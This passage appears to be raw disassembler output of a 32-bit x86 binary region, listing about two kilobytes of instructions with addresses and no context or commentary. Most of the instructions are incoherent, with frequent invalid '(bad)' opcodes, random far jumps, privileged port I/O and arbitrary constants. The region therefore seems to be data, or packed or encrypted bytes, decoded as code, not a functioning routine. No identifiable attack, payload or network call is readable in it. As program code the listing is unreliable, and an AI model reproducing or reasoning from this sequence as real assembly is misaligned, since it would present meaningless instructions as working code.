  4195ad:	sbb    DWORD PTR [ecx+0x73],edi
  4195b0:	push   ss
  4195b1:	jp     0x419572
  4195b3:	sub    BYTE PTR [esi],bl
  4195b5:	js     0x419581
  4195b7:	fdiv   st(4),st
  4195b9:	sbb    eax,0x739289be
  4195be:	jp     0x419615
  4195c0:	adc    eax,0x87a93f3e
  4195c5:	xchg   esp,eax
  4195c6:	cmovs  ecx,DWORD PTR [eax-0x5bb7e09]
  4195cd:	xor    BYTE PTR [ebp-0x34],dh
  4195d0:	pop    ds
  4195d1:	push   esp
  4195d2:	cdq    
  4195d3:	ja     0x4195fe
  4195d5:	shl    BYTE PTR [ebp+0x5],cl
  4195d8:	sbb    ah,BYTE PTR [esi+eax*1]
  4195db:	jnp    0x41959c
  4195dd:	push   es
  4195de:	xor    DWORD PTR [ecx-0x6a],ebp
  4195e1:	jmp    0x4195be
  4195e3:	iret   
  4195e4:	pop    ecx
  4195e5:	mov    DWORD PTR [ecx+0x7da92c2b],ebp
  4195eb:	rcl    esi,0x1d
  4195ee:	adc    bh,BYTE PTR [ebx-0x3e075be0]
  4195f4:	push   ecx
  4195f5:	adc    bl,ah
  4195f7:	pop    esi
  4195f8:	or     esi,DWORD PTR [edx]
  4195fa:	xor    esi,ebx
  4195fc:	or     eax,0xd6a0dcb6
  419601:	mov    ch,BYTE PTR [ecx-0x1d]
  419604:	aam    0xdc
  419606:	jl     0x41959c
  419608:	jno    0x419641
  41960a:	out    dx,eax
  41960b:	scas   eax,DWORD PTR es:[edi]
  41960c:	add    cl,bh
  41960e:	xor    DWORD PTR [ebx-0x43719fa],0x3d
  419615:	shr    DWORD PTR [eax],1
  419617:	call   0x94b:0xfbb1ee8b
  41961e:	xor    DWORD PTR ds:0x4e147e6b,0x2b
  419625:	mov    eax,ds:0xc09ed78b
  41962a:	xchg   edx,eax
  41962b:	xchg   BYTE PTR ss:[eax+0x4d783807],dl
  419632:	xchg   ecx,eax
  419633:	repz xchg ecx,eax
  419635:	xchg   ecx,eax
  419636:	pop    edx
  419637:	mov    cl,0x4f
  419639:	adc    al,0xf5
  41963b:	test   BYTE PTR [ebp+0x4083ad16],dl
  419641:	xchg   ebx,eax
  419642:	and    BYTE PTR [eax*4+0x7b24a55d],al
  419649:	mov    al,0xcb
  41964b:	outs   dx,DWORD PTR ds:[esi]
  41964c:	es dec ecx
  41964e:	(bad)  
  419650:	dec    dl
  419652:	out    0x17,eax
  419654:	aaa    
  419655:	xor    dl,ah
  419657:	jns    0x4196a1
  419659:	shr    esi,cl
  41965b:	sub    al,0x9b
  41965d:	mov    cl,0xa
  41965f:	inc    edi
  419660:	jns    0x4196ae
  419662:	mov    ebx,0x9c5ac6e4
  419667:	idiv   esi
  419669:	jmp    0x1c3c:0xb6476c5a
  419670:	repnz (bad) 
  419672:	mov    eax,ds:0xc18d4a53
  419677:	adc    ebx,0x59645d4a
  41967d:	stos   DWORD PTR es:[edi],eax
  41967e:	nop
  41967f:	push   esi
  419680:	test   DWORD PTR [ebx],esp
  419682:	and    al,0xd2
  419684:	add    eax,0xa0e4f522
  419689:	inc    ebp
  41968a:	jmp    0xd730:0x5e227887
  419691:	fistp  QWORD PTR ss:[ecx]
  419694:	lock fimul DWORD PTR [ecx-0xa4a8726]
  41969b:	es aam 0x60
  41969e:	mov    edx,0xe1fe01d1
  4196a3:	pop    ebx
  4196a4:	jb     0x4196c8
  4196a6:	adc    dl,BYTE PTR [ebp-0x10]
  4196a9:	add    DWORD PTR ss:[esi+0x16c1db24],edx
  4196b0:	int    0xfc
  4196b2:	popa   
  4196b3:	cmp    al,0xd4
  4196b5:	clc    
  4196b6:	shl    BYTE PTR [edx+ebx*8],1
  4196b9:	mov    al,ds:0xf8f9f8ad
  4196be:	sbb    eax,0xb9c398b2
  4196c3:	mov    edi,0xc08b6833
  4196c8:	or     dh,BYTE PTR [ecx+0x25]
  4196cb:	inc    edi
  4196cc:	mov    al,ds:0x8ea1af58
  4196d1:	mov    ch,0x72
  4196d3:	or     BYTE PTR [edi+0x4e94ed2d],dh
  4196d9:	or     ah,BYTE PTR [ecx+0x6b2007aa]
  4196df:	push   0x8bcdfb8f
  4196e4:	and    edi,ebx
  4196e6:	or     al,0xe6
  4196e8:	pop    ss
  4196e9:	dec    eax
  4196ea:	shr    DWORD PTR [edx-0x4],0xe6
  4196ee:	mov    esi,0x5b4c13f6
  4196f3:	cld    
  4196f4:	daa    
  4196f5:	mov    al,ds:0x23e0be11
  4196fa:	adc    al,0xc9
  4196fc:	jne    0x419724
  4196fe:	sbb    eax,0x39a9e059
  419703:	add    ch,BYTE PTR [ecx-0x52d3f1aa]
  419709:	cdq    
  41970a:	push   eax
  41970b:	(bad)  
  41970c:	jmp    0x3144ee7
  419711:	mov    bh,0x9b
  419713:	xor    ah,BYTE PTR [edi-0x34f4da61]
  419719:	xchg   edi,eax
  41971a:	iret   
  41971b:	in     al,0xfc
  41971d:	arpl   WORD PTR ds:0x518512ae,bp
  419723:	popf   
  419724:	push   ss
  419725:	jmp    0xbccc5253
  41972a:	mov    dh,0x24
  41972c:	dec    edx
  41972d:	pop    ebx
  41972e:	in     al,0xf7
  419730:	outs   dx,BYTE PTR ds:[esi]
  419731:	inc    edi
  419732:	enter  0x6e8b,0xcf
  419736:	inc    ebx
  419737:	pop    edi
  419738:	and    ah,BYTE PTR [edi+0xf]
  41973b:	sub    al,0xfc
  41973d:	ja     0x4196de
  41973f:	vmpsadbw ymm1,ymm3,YMMWORD PTR [ebx-0x1d19ed42],0xb0
  419749:	arpl   WORD PTR [edx-0x765fb6e8],bx
  41974f:	adc    DWORD PTR [ebp+eiz*4+0xa7baac5],0x1b
  419757:	sar    BYTE PTR [edi+0x6b7b8385],1
  41975d:	mov    eax,ds:0xf8e1c821
  419762:	xchg   esp,eax
  419763:	inc    esi
  419764:	push   eax
  419765:	(bad)  
  419766:	jo     0x41975e
  419768:	popa   
  419769:	fmul   QWORD PTR [edx]
  41976b:	pop    ds
  41976c:	in     eax,0x45
  41976e:	mov    ebx,0x50887500
  419773:	ficomp WORD PTR [ecx+0x419dac1c]
  419779:	out    0x38,al
  41977b:	shr    BYTE PTR [edi],1
  41977d:	(bad)  
  41977e:	aam    0xd4
  419780:	sbb    eax,0x71bb9e3c
  419785:	cmp    al,0x4c
  419787:	ins    DWORD PTR es:[edi],dx
  419788:	arpl   WORD PTR [edx-0x4b4a423],cx
  41978e:	loopne 0x419750
  419790:	stos   DWORD PTR es:[edi],eax
  419791:	adc    cl,BYTE PTR [esp+esi*2]
  419794:	std    
  419795:	cmp    ch,dh
  419797:	(bad)  
  419798:	push   edx
  419799:	cli    
  41979a:	cwde   
  41979b:	or     eax,0x235224be
  4197a0:	retf   0x7bb0
  4197a3:	cmp    eax,0xa0740994
  4197a8:	push   0x545c99c6
  4197ad:	fs and al,0x6
  4197b0:	add    BYTE PTR [eax],0x5d
  4197b3:	fldl2t 
  4197b5:	jns    0x4197b6
  4197b7:	xchg   DWORD PTR [ebp-0x1b],edi
  4197ba:	test   edi,edx
  4197bc:	js     0x41976b
  4197be:	ret    0xf3a2
  4197c1:	lahf   
  4197c2:	fwait
  4197c3:	(bad)  
  4197c4:	sub    BYTE PTR [edx+0x4f],bh
  4197c7:	sub    esp,DWORD PTR [eax+edi*1-0x425fbaa5]
  4197ce:	popf   
  4197cf:	sbb    eax,ebp
  4197d1:	cmp    esi,DWORD PTR [eax]
  4197d3:	loope  0x419799
  4197d5:	clc    
  4197d6:	int    0xe1
  4197d8:	mov    al,ds:0xce721554
  4197dd:	shr    BYTE PTR [esi],cl
  4197df:	push   ebp
  4197e0:	nop
  4197e1:	in     eax,dx
  4197e2:	int3   
  4197e3:	fbstp  TBYTE PTR [edi+ebx*2-0x36]
  4197e7:	add    dl,BYTE PTR [edx+0x62660cb7]
  4197ed:	pop    esi
  4197ee:	je     0x4197a5
  4197f0:	fs fwait
  4197f2:	and    al,0x8e
  4197f4:	addr16 js 0x41984d
  4197f7:	fs jns 0x4197ba
  4197fa:	jle    0x41981c
  4197fc:	into   
  4197fd:	xor    al,0x48
  4197ff:	xor    al,BYTE PTR [ecx]
  419801:	mov    esi,DWORD PTR [esi+0xaa3c02]
  419807:	lock dec ecx
  419809:	mov    bh,0xfa
  41980b:	cwde   
  41980c:	pop    eax
  41980d:	outs   dx,DWORD PTR ds:[esi]
  41980e:	jmp    0x41987a
  419810:	mov    edx,0x41e7310a
  419815:	or     DWORD PTR [edx+0x4fae747d],ebp
  41981b:	mov    ds:0x42094fda,eax
  419820:	(bad)  
  419821:	lock mov bl,0x62
  419824:	mov    al,0x25
  419826:	xchg   esp,eax
  419827:	cwde   
  419828:	jmp    0x59f63985
  41982d:	adc    edi,DWORD PTR [esi+ecx*2+0x77]
  419831:	test   DWORD PTR [ecx],esp
  419833:	or     al,0x70
  419835:	mov    al,ds:0x52948370
  41983a:	stos   DWORD PTR es:[edi],eax
  41983b:	sbb    al,0xb3
  41983d:	push   0xb06e8557
  419842:	jle    0x4197e4
  419844:	xor    DWORD PTR [edx],0x37
  419847:	daa    
  419848:	in     al,0x2f
  41984a:	jns    0x41987a
  41984c:	add    ah,BYTE PTR [ebx+0x26dc314]
  419852:	jl     0x419856
  419854:	imul   edi,eax,0x5e
  419857:	jmp    0x2f9ad81a
  41985c:	cli    
  41985d:	sbb    eax,0x4d0849be
  419862:	rol    BYTE PTR [ebx+0x3dbe8468],cl
  419868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419869:	sub    al,BYTE PTR [ebx-0x2d]
  41986c:	cld    
  41986d:	repnz lea edi,[ecx-0x4a1b65b4]
  419874:	inc    esi
  419875:	outs   dx,BYTE PTR ds:[esi]
  419876:	ret    
  419877:	xchg   ebx,eax
  419878:	push   0xffffffb1
  41987a:	jmp    0xad95:0x6c2e6849
  419881:	or     DWORD PTR [ebx+ecx*1-0x18b776ee],ecx
  419888:	push   cs
  419889:	mov    esp,DWORD PTR [ebx]
  41988b:	sbb    eax,0xb301ffae
  419890:	mov    cl,0x5c
  419892:	dec    eax
  419893:	std    
  419894:	jno    0x4198c9
  419896:	sbb    ebx,DWORD PTR [eax-0x32]
  419899:	inc    edx
  41989a:	dec    ecx
  41989b:	test   BYTE PTR [esp+eiz*8-0x22],bl
  41989f:	jg     0x41988c
  4198a1:	fld    DWORD PTR [edi-0x10]
  4198a4:	fwait
  4198a5:	into   
  4198a6:	inc    eax
  4198a7:	pop    esp
  4198a8:	sahf   
  4198a9:	jl     0x4198e2
  4198ab:	and    al,0xc7
  4198ad:	jo     0x419872
  4198af:	(bad)  
  4198b1:	sbb    BYTE PTR [ebx-0x20de943e],0x2e
  4198b8:	cdq    
  4198b9:	imul   edx,DWORD PTR [edx+ecx*2],0x3d759f92
  4198c0:	stos   BYTE PTR es:[edi],al
  4198c1:	call   0x21f3:0x29942480
  4198c8:	pop    ss
  4198c9:	fld    DWORD PTR [ebp+0xe]
  4198cc:	test   DWORD PTR [ecx+eiz*2],esi
  4198cf:	add    BYTE PTR [edx+0x2cfe3f31],cl
  4198d5:	push   esp
  4198d6:	mov    ebp,0xa6706f35
  4198db:	jns    0x4198fa
  4198dd:	lahf   
  4198de:	adc    BYTE PTR [eax+ebx*4],0x5a
  4198e2:	or     eax,0xe67753d9
  4198e7:	sbb    ah,BYTE PTR ds:0x16804219
  4198ed:	add    al,0xdb
  4198ef:	ins    DWORD PTR es:[edi],dx
  4198f0:	arpl   WORD PTR [ebx],si
  4198f2:	lock shl BYTE PTR [esi+0x4a02d587],1
  4198f9:	jne    0x4198ae
  4198fb:	pop    eax
  4198fc:	jl     0x419898
  4198fe:	loop   0x419963
  419900:	fstp   DWORD PTR [esi-0x2144b183]
  419906:	in     eax,dx
  419907:	dec    ecx
  419908:	fmul   DWORD PTR [eax]
  41990a:	mov    ds:0x4785f800,eax
  41990f:	add    ecx,DWORD PTR [edi]
  419911:	pop    ebx
  419912:	inc    eax
  419913:	mov    al,0xeb
  419915:	mov    dh,0x65
  419917:	xor    ebx,ebx
  419919:	dec    edi
  41991a:	inc    eax
  41991b:	test   esp,edi
  41991d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41991e:	lock dec edi
  419920:	mov    edi,0x309f6ec
  419925:	into   
  419926:	pop    eax
  419927:	je     0x419999
  419929:	fwait
  41992a:	xchg   BYTE PTR [ecx-0x67532885],dl
  419930:	imul   esp,DWORD PTR [ecx+0x5d],0x5663b2d7
  419937:	shr    BYTE PTR [ebx+0x74c09cda],0x55
  41993e:	inc    eax
  41993f:	stos   BYTE PTR es:[edi],al
  419940:	add    al,0x15
  419942:	mov    esi,0x2b1945ca
  419947:	cs pop ecx
  419949:	aas    
  41994a:	enter  0x7c9c,0x2
  41994e:	inc    esp
  41994f:	shl    edi,1
  419951:	ss (bad) 
  419954:	jmp    0x43eab11f
  419959:	imul   esp,esi,0xffffffc0
  41995c:	add    DWORD PTR [eax+0x4c],0x29f107ee
  419963:	or     esp,DWORD PTR [edx-0x2]
  419966:	sti    
  419967:	or     BYTE PTR [esp+ebp*2-0x2],dl
  41996b:	scas   eax,DWORD PTR es:[edi]
  41996c:	mov    esp,0x761d46d3
  419971:	dec    ebp
  419972:	or     edx,DWORD PTR [ecx+eax*2-0x71a6af8]
  419979:	inc    edx
  41997a:	xchg   edx,eax
  41997b:	jnp    0x4199ed
  41997d:	mov    bh,0x9d
  41997f:	ret    
  419980:	popf   
  419981:	fcomp  QWORD PTR es:[eax-0x6004a3f8]
  419988:	call   0xc896ed40
  41998d:	jl     0x419959
  41998f:	xchg   DWORD PTR [edi],edx
  419991:	sub    bh,BYTE PTR [eax-0x9]
  419994:	jne    0x419996
  419996:	dec    ebp
  419997:	out    0xce,eax
  419999:	cmp    ecx,esp
  41999b:	test   al,0xe
  41999d:	lea    ecx,[ebp-0x4c]
  4199a0:	popf   
  4199a1:	add    edi,DWORD PTR [edx]
  4199a3:	and    BYTE PTR [esi+0x7404da0a],ah
  4199a9:	test   al,0xcc
  4199ab:	pop    ebx
  4199ac:	mov    fs,WORD PTR [edx]
  4199ae:	iret   
  4199af:	ret    0xd3eb
  4199b2:	enter  0x234e,0xf1
  4199b6:	shl    BYTE PTR ds:[edi+0x65184223],cl
  4199bd:	mov    bh,0x78
  4199bf:	jecxz  0x419a3e
  4199c1:	lahf   
  4199c2:	fnstenv [edi-0x12f22508]
  4199c8:	pusha  
  4199c9:	mov    esp,0xa056aee3
  4199ce:	cmp    eax,0x5fbec003
  4199d3:	sti    
  4199d4:	cmp    eax,0xfa57b2bb
  4199d9:	aam    0x95
  4199db:	push   edi
  4199dc:	push   ebx
  4199dd:	icebp  
  4199de:	cdq    
  4199df:	sbb    ebx,esi
  4199e1:	push   edx
  4199e2:	inc    ebp
  4199e3:	push   edi
  4199e4:	dec    ebp
  4199e5:	push   ebp
  4199e6:	outs   dx,DWORD PTR ds:[esi]
  4199e7:	xor    edx,DWORD PTR [esi-0x141cef1d]
  4199ed:	or     eax,0xc97660d0
  4199f2:	in     eax,0xb0
  4199f4:	xchg   ecx,eax
  4199f5:	cmp    BYTE PTR [esi+0x31],0xee
  4199f9:	mov    edi,0xc261372
  4199fe:	aaa    
  4199ff:	dec    esp
  419a00:	inc    ecx
  419a01:	sbb    eax,0x1383e2ca
  419a06:	sub    al,0x76
  419a08:	inc    esi
  419a09:	test   DWORD PTR [ebx+0x3f429ed9],0xaea80856
  419a13:	gs mov eax,0xded8668c
  419a19:	adc    BYTE PTR [ebp-0x4313738e],0xcd
  419a20:	stc    
  419a21:	add    eax,0x94bc684d
  419a26:	jnp    0x419aa2
  419a28:	cs adc eax,0x12bcdc1e
  419a2e:	xchg   ecx,eax
  419a2f:	adc    BYTE PTR [esi+eiz*2],ch
  419a32:	(bad)  
  419a33:	adc    DWORD PTR [ecx-0x5e],esp
  419a36:	(bad)  
  419a37:	outs   dx,DWORD PTR ds:[esi]
  419a38:	mov    ds:0xe1a9fde0,al
  419a3d:	(bad)  
  419a3f:	pushf  
  419a40:	xlat   BYTE PTR ds:[ebx]
  419a41:	push   ecx
  419a42:	(bad)  
  419a43:	adc    eax,0x5383e725
  419a48:	ds shr esi,cl
  419a4b:	hlt    
  419a4c:	dec    DWORD PTR [edx+ebx*8+0x2c13c2e]
  419a53:	call   0x8fe99960
  419a58:	or     dh,BYTE PTR [eax-0x34e9f482]
  419a5e:	lds    bx,DWORD PTR [eax+0x4b]
  419a62:	add    eax,edi
  419a64:	mov    WORD PTR es:[edx-0x32d8b52f],fs
  419a6b:	add    ecx,DWORD PTR [eax]
  419a6d:	leave  
  419a6e:	(bad)  
  419a6f:	in     al,0x22
  419a71:	xor    dh,al
  419a73:	dec    ecx
  419a74:	cmp    ecx,DWORD PTR [esp+eax*1-0x7a1dcb61]
  419a7b:	bound  ecx,QWORD PTR [edi+0x21ff8b1e]
  419a81:	cmp    ebp,DWORD PTR [edx-0x16]
  419a84:	ins    BYTE PTR es:[edi],dx
  419a85:	pusha  
  419a86:	scas   al,BYTE PTR es:[edi]
  419a87:	call   0xf500:0xfae3f747
  419a8e:	aam    0x96
  419a90:	aam    0x94
  419a92:	(bad)  
  419a93:	popf   
  419a94:	pushf  
  419a95:	cmc    
  419a96:	mov    edi,0xf8dadb36
  419a9b:	hlt    
  419a9c:	jmp    0x98bd48e0
  419aa1:	test   al,0x3f
  419aa3:	jbe    0x419a42
  419aa5:	sub    ah,al
  419aa7:	das    
  419aa8:	fild   WORD PTR [eax+0x50]
  419aab:	out    0x3c,eax
  419aad:	pop    esi
  419aae:	stc    
  419aaf:	dec    ebx
  419ab0:	movaps xmm2,XMMWORD PTR [esi]
  419ab3:	scas   al,BYTE PTR es:[edi]
  419ab4:	hlt    
  419ab5:	iret   
  419ab6:	pusha  
  419ab7:	jg     0x419a6d
  419ab9:	popf   
  419aba:	jo     0x419aa1
  419abc:	jb     0x419ad3
  419abe:	adc    edi,DWORD PTR [ebx-0x53df5974]
  419ac4:	inc    ebp
  419ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ac6:	nop
  419ac7:	push   ebp
  419ac8:	cmp    ebx,DWORD PTR [ebx]
  419aca:	cs pusha 
  419acc:	js     0x419b04
  419ace:	scas   al,BYTE PTR es:[edi]
  419acf:	adc    dl,cl
  419ad1:	lss    ebx,FWORD PTR [eax]
  419ad4:	xor    DWORD PTR [ebp-0x636ecfc2],ecx
  419ada:	mov    ebx,0xe5b4be13
  419adf:	cmp    dl,BYTE PTR ds:0x8bb17a75
  419ae5:	pop    esp
  419ae6:	(bad)  
  419ae7:	ficomp DWORD PTR [edi+0xc]
  419aea:	xor    esi,ecx
  419aec:	sub    esi,eax
  419aee:	mov    eax,DWORD PTR [ebp-0x4]
  419af1:	add    esi,edx
  419af3:	cmp    DWORD PTR [eax],esi
  419af5:	mov    eax,DWORD PTR [ebp-0x4]
  419af8:	mov    esi,DWORD PTR [ebp+0x10]
  419afb:	jg     0x41becb
  419b01:	jmp    0x41bebb
  419b06:	push   ecx
  419b07:	bound  esp,QWORD PTR [ebp+0x516ab665]
  419b0d:	jp     0x419af1
  419b0f:	xchg   ebx,eax
  419b10:	js     0x419adb
  419b12:	repz ficomp DWORD PTR [esi+edx*4+0x7b7cdc47]
  419b1a:	sbb    BYTE PTR [esi-0x290e8485],bl
  419b20:	lock jne 0x419af8
  419b23:	mov    cs,WORD PTR [ecx-0x72]
  419b26:	adc    bh,BYTE PTR [edx+0x1473ca2e]
  419b2c:	push   ebx
  419b2d:	lods   al,BYTE PTR ds:[esi]
  419b2e:	sbb    eax,0xebbfbd2f
  419b33:	mov    ebp,0x8a751f99
  419b38:	aam    0x8
  419b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b3b:	addr16 jno 0x419b69
  419b3e:	retf   0xd24
  419b41:	ja     0x419b87
  419b43:	retf   0xf666
  419b46:	add    al,0xf5
  419b48:	and    ecx,DWORD PTR [ebx-0x2a36936e]
  419b4e:	jne    0x419bb8
  419b50:	jns    0x419af4
  419b52:	pop    eax
  419b53:	jge    0x419bc0
  419b55:	sbb    eax,0x833790de
  419b5a:	adc    al,0x23
  419b5c:	shl    BYTE PTR [edx+ebp*4],0xdc
  419b60:	leave  
  419b61:	out    0x7c,eax
  419b63:	sbb    al,0xa8
  419b65:	popa   
  419b66:	xor    eax,DWORD PTR [edx+0x147cbce1]
  419b6c:	aad    0xe4
  419b6e:	outs   dx,BYTE PTR ds:[esi]
  419b6f:	adc    al,0x52
  419b72:	dec    eax
  419b73:	mov    BYTE PTR [edx],ch
  419b75:	xor    eax,0x2230e8e3
  419b7a:	adc    eax,DWORD PTR [ecx+edx*8+0x5e7561a6]
  419b81:	leave  
  419b82:	add    eax,0xfe385fda
  419b87:	ffree  st(7)
  419b89:	dec    dl
  419b8b:	sbb    edx,DWORD PTR [ebp+0x64]
  419b8e:	pop    edx
  419b8f:	test   BYTE PTR [edi],al
  419b91:	sub    dh,ah
  419b93:	mov    al,0x4a
  419b95:	dec    esp
  419b96:	call   DWORD PTR [edx+0x4f]
  419b99:	mov    ecx,0xc313b919
  419b9e:	jnp    0x419b99
  419ba0:	sub    BYTE PTR [edx],bl
  419ba2:	imul   esp,DWORD PTR [eax-0x3d2cf0c3],0xffffffea
  419ba9:	outs   dx,BYTE PTR ds:[esi]
  419baa:	xchg   edi,ebx
  419bac:	iret   
  419bad:	mov    bl,cl
  419baf:	aaa    
  419bb0:	mov    BYTE PTR [ebp-0x476e98ff],0xdd
  419bb7:	xlat   BYTE PTR ds:[ebx]
  419bb8:	cmp    DWORD PTR ds:0x257c4c71,ebx
  419bbe:	mov    esi,0x19ea59d3
  419bc3:	pop    ecx
  419bc4:	add    ch,ch
  419bc6:	fbstp  TBYTE PTR [ebx+ebp*1]
  419bc9:	cmp    ebx,edx
  419bcb:	add    BYTE PTR [ebp-0x3bd734d5],bl
  419bd1:	(bad)  
  419bd2:	fcom   DWORD PTR [ebx-0x3ac05f82]
  419bd8:	cmp    dh,BYTE PTR [edi+0x4b39226b]
  419bde:	jle    0x419bc5
  419be0:	shl    BYTE PTR [edx-0x469d530a],1
  419be6:	xchg   ebp,eax
  419be7:	jg     0x419c26
  419be9:	and    BYTE PTR [eax],0x3e
  419bec:	sub    eax,edx
  419bee:	sub    eax,0x4536fcb6
  419bf3:	adc    ebp,esi
  419bf5:	mov    ebx,0x246610fe
  419bfa:	jg     0x419c17
  419bfc:	lods   al,BYTE PTR ds:[esi]
  419bfd:	ret    
  419bfe:	je     0x419b86
  419c00:	int3   
  419c01:	sbb    DWORD PTR [ebp-0x4a],0xedc6df06
  419c08:	cmp    esp,esi
  419c0a:	ret    0x478f
  419c0d:	push   0x616ad6c9
  419c12:	dec    esi
  419c13:	ins    DWORD PTR es:[edi],dx
  419c14:	mov    ecx,0xef30cc68
  419c19:	inc    BYTE PTR [esi]
  419c1b:	mov    ebp,0x79f96b6a
  419c20:	xlat   BYTE PTR ds:[ebx]
  419c21:	or     eax,0x101b19ac
  419c26:	xor    eax,0x947f9a62
  419c2b:	push   ds
  419c2c:	dec    ebp
  419c2d:	push   edx
  419c2e:	push   ebx
  419c2f:	inc    esi
  419c30:	xchg   ebx,eax
  419c31:	arpl   WORD PTR [eax],sp
  419c33:	nop
  419c34:	jo     0x419be3
  419c36:	mov    ds:0x2704c386,eax
  419c3b:	pop    esi
  419c3c:	push   eax
  419c3d:	push   0xffffff9a
  419c3f:	and    ch,al
  419c41:	mov    bl,BYTE PTR [ebx+eiz*1+0x22]
  419c45:	retf   0xfb02
  419c48:	jnp    0x419c09
  419c4a:	inc    eax
  419c4b:	or     eax,0xe3beb3ab
  419c50:	(bad)  
  419c51:	fcom   DWORD PTR [edx]
  419c53:	xchg   esp,eax
  419c54:	stos   BYTE PTR es:[edi],al
  419c55:	mov    cl,0x51
  419c57:	jp     0x419c8c
  419c59:	cmp    edx,DWORD PTR [ecx]
  419c5b:	xor    DWORD PTR [ebx],ebp
  419c5d:	test   al,0xc6
  419c5f:	mov    ecx,0x3e2e43be
  419c64:	xchg   ebx,eax
  419c65:	fld    QWORD PTR [ebx-0x19324547]
  419c6b:	xor    DWORD PTR [eax+edx*1+0x4752c8eb],eax
  419c72:	inc    ebx
  419c73:	or     ebp,0xa4d11b6b
  419c79:	mov    ch,BYTE PTR ds:0x1889411e
  419c7f:	loope  0x419c19
  419c81:	imul   DWORD PTR [ecx-0x6f]
  419c84:	mov    ebp,0x4408ba9
  419c89:	call   0xaf625e19
  419c8e:	test   ebp,0x1b581308
  419c94:	mov    ds:0xb4ca4c1f,al
  419c99:	stos   DWORD PTR es:[edi],eax
  419c9a:	std    
  419c9b:	test   DWORD PTR ds:0xb17b1204,ecx
  419ca1:	loopne 0x419d07
  419ca3:	mov    ds:0xce85fe90,al
  419ca8:	pop    ebp
  419ca9:	add    eax,0x5ecc25b6
  419cae:	fldcw  WORD PTR [ebx-0x155e90cf]
  419cb4:	out    0xf,eax
  419cb6:	jo     0x419c8e
  419cb8:	push   sp
  419cba:	jp     0x419d35
  419cbc:	stos   BYTE PTR es:[edi],al
  419cbd:	inc    eax
  419cbe:	repz or ah,ch
  419cc1:	xor    al,0xd6
  419cc3:	sub    eax,0x7b567fb7
  419cc8:	adc    DWORD PTR [edx],esi
  419cca:	cs pop ss
  419ccc:	adc    al,0x46
  419cce:	scas   al,BYTE PTR es:[edi]
  419ccf:	jns    0x419cc5
  419cd1:	loop   0x419cae
  419cd3:	pop    edx
  419cd4:	sbb    BYTE PTR [esi+eax*2+0x6e],ah
  419cd8:	cmpxchg BYTE PTR [edi+ecx*1-0x51a466fc],dh
  419ce0:	jns    0x419ce9
  419ce2:	push   ss
  419ce3:	jmp    0xe6b6125f
  419ce8:	mov    ch,0x64
  419cea:	cmp    esi,edx
  419cec:	unpckhps xmm2,XMMWORD PTR ds:0xbbda3006
  419cf3:	mov    DWORD PTR [edx-0x54820894],0x6f8f92dd
  419cfd:	add    DWORD PTR [ecx-0x1adc3c0],esp
  419d03:	push   edx
  419d04:	mov    edi,0x8763374b
  419d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d0a:	clc    
  419d0b:	and    dl,BYTE PTR [ebp-0x43a3045e]
  419d11:	call   edi
  419d13:	aam    0x5d
  419d15:	sar    DWORD PTR [edi],0x4a
  419d18:	jle    0x419d85
  419d1a:	aaa    
  419d1b:	int3   
  419d1c:	(bad)  
  419d1d:	clc    
  419d1e:	(bad)  
  419d1f:	and    ah,BYTE PTR [esp+ecx*8+0x40bc1503]
  419d26:	shl    DWORD PTR [eax],1
  419d28:	das    
  419d29:	jns    0x419d23
  419d2b:	fstp   TBYTE PTR [edi+eax*8-0x5a]
  419d2f:	inc    eax
  419d30:	rcl    dl,cl
  419d32:	mov    dl,al
  419d34:	mov    ch,0x39
  419d36:	aam    0x63
  419d38:	and    eax,0x909edc1d
  419d3d:	dec    ebp
  419d3e:	cld    
  419d3f:	stc    
  419d40:	ja     0x419d82
  419d42:	push   edi
  419d43:	dec    esi
  419d44:	pop    eax
  419d45:	sub    eax,0xa528928c
  419d4a:	(bad)  
  419d4b:	lock fimul WORD PTR [esp+ebx*2-0x18]
  419d50:	popf   
  419d51:	or     dl,BYTE PTR [edx-0x3d]
  419d54:	cdq    
  419d55:	(bad)  
  419d56:	ds call 0xab42:0xe47943df
  419d5e:	clc    
  419d5f:	jp     0x419d42
  419d61:	jno    0x419d23
  419d63:	(bad)  
  419d64:	lock jo 0x419d63
  419d67:	lea    eax,[ecx*2-0x33490948]
  419d6e:	mov    bl,0x2b
  419d70:	inc    ecx
  419d71:	hlt    
  419d72:	je     0x419d07
  419d74:	popf   
  419d75:	mov    edx,DWORD PTR [edx-0x524ccd3]
  419d7b:	and    bh,dh
  419d7d:	ins    BYTE PTR es:[edi],dx
  419d7e:	jnp    0x419da5
  419d80:	gs push cs
  419d82:	dec    edx
  419d83:	ficom  WORD PTR [edx-0x3d]
  419d86:	mov    bl,0xa8
  419d88:	cmp    eax,0x5c4e8fa4
  419d8d:	mov    WORD PTR [ecx+0x1a],es
  419d90:	mov    ecx,0x4d53fbc7
  419d95:	inc    edi
  419d96:	add    bl,bl
  419d98:	or     BYTE PTR [edx-0x111caaf6],ch
  419d9e:	jb     0x419d50
  419da0:	xor    ebx,edx
  419da2:	push   cs
  419da3:	sbb    cl,BYTE PTR [edx+eax*8+0x6fe41447]
  419daa:	cmp    eax,0x9ec6864b
  419daf:	nop
  419db0:	mov    eax,ds:0xe65c25e
  419db5:	int3   
  419db6:	xlat   BYTE PTR ds:[ebx]
  419db7:	out    0xe,al
  419db9:	mov    ebp,0x8eae6e15
  419dbe:	or     eax,0x6ad17f3
  419dc3:	nop
  419dc4:	and    BYTE PTR [ecx-0x5],ch
  419dc7:	jp     0x419d50
  419dc9:	xchg   edx,eax
  419dca:	mov    ebp,edi
  419dcc:	jbe    0x419df9
  419dce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dcf:	inc    esi
  419dd0:	outs   dx,DWORD PTR ds:[esi]
  419dd1:	cmc    
  419dd2:	jb     0x419e4d
  419dd4:	gs inc ebx
  419dd6:	rcl    BYTE PTR [ebx-0xb5bdaa1],1
  419ddc:	cmp    BYTE PTR [ecx-0x69],cl
  419ddf:	scas   eax,DWORD PTR es:[edi]
  419de0:	test   eax,0x7fa99912
  419de5:	xchg   edi,eax
  419de6:	pop    ds
  419de7:	out    dx,al
  419de8:	jno    0x419e40
  419dea:	retf   
  419deb:	movups XMMWORD PTR [ebx+0x2b],xmm1
  419def:	or     BYTE PTR [edx+0x6],cl
  419df2:	push   0x86c71264
  419df7:	adc    al,0x3
  419df9:	frstor [edi-0x305f9d1a]
